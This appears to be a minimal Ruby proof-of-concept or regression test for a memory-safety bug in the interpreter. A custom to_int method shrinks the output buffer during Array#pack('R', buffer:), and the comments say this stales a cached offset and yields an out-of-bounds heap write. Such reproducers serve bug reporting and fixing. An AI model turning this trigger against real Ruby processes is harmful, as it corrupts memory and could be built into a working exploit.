# Array#pack("R", buffer:) — element to_int shrinks the buffer (res); cached `start` stale -> OOB write
buf = "X" * 200
$buf = buf
evil = Object.new
def evil.to_int
  $buf.replace("")     # shrink res mid-pack; `start`(=200) now stale
  1000000              # multi-byte ULEB128 value -> rb_integer_pack writes at res+200
end
[evil].pack("R", buffer: buf)
puts "p01 ok"
